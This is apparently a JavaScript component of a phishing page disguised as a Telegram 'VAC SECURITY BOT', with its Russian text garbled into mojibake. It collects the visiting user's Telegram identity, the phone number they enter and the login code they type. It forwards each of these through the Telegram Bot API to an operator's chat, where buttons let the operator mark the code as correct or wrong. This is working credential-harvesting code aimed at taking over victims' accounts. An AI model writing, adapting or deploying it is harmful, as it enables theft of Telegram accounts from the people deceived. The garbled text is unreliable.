// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±—É–¥–µ—Ç –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –ø—Ä–∏ —Å–±–æ—Ä–∫–µ
const config = {
    botToken: '%%BOT_TOKEN%%',
    adminId: '%%ADMIN_ID%%'
};

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–∞–º–∏
const formatMessage = (user, action, data) => {
    const userInfo = `üë§ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> <code>${escapeHtml(user.first_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')} ${escapeHtml(user.last_name || '')}</code>\n` +
                    `üÜî <b>ID:</b> <code>${user.id || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>\n` +
                    (user.username ? `üîó <b>Username:</b> @${escapeHtml(user.username)}\n` : '');

    let actionText = '';
    let buttons = [];
    
    switch(action) {
        case 'init':
            actionText = 'üö™ <b>–í–æ—à–µ–ª –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</b>';
            break;
        case 'phone':
            actionText = `üì± <b>–í–≤–µ–ª –Ω–æ–º–µ—Ä:</b> <code>${escapeHtml(data)}</code>`;
            break;
        case 'code':
            actionText = `üî¢ <b>–í–≤–µ–ª –∫–æ–¥:</b> <code>${escapeHtml(data)}</code>`;
            buttons = [
                [{ text: "‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥", callback_data: `approve_${user.id}_${data}` }],
                [{ text: "‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥", callback_data: `reject_${user.id}_${data}` }]
            ];
            break;
        case 'verified':
            actionText = '‚úÖ <b>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω!</b>';
            break;
        case 'failed':
            actionText = '‚ùå <b>–ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω</b>';
            break;
    }

    return {
        text: `üîê <b>VAC SECURITY BOT</b>\n\n${userInfo}\n${actionText}`,
        reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    };
};

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–∞–º–∏
const sendToAdmin = async (messageData) => {
    try {
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        const params = {
            chat_id: config.adminId,
            text: messageData.text,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: messageData.reply_markup
        };

        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params)
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
    }
};

// –ì–ª–æ–±–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–±—ã—Ç–∏–π
window.sendToBot = async (action, data = null) => {
    const tg = window.Telegram.WebApp;
    const user = tg.initDataUnsafe.user || {};
    const messageData = formatMessage(user, action, data);
    await sendToAdmin(messageData);
};

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
document.addEventListener('DOMContentLoaded', () => {
    // –ó–∞–º–µ–Ω—è–µ–º –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
    if (window.BOT_CONFIG) {
        config.botToken = window.BOT_CONFIG.botToken;
        config.adminId = window.BOT_CONFIG.adminId;
    }
    
    window.sendToBot('init');
});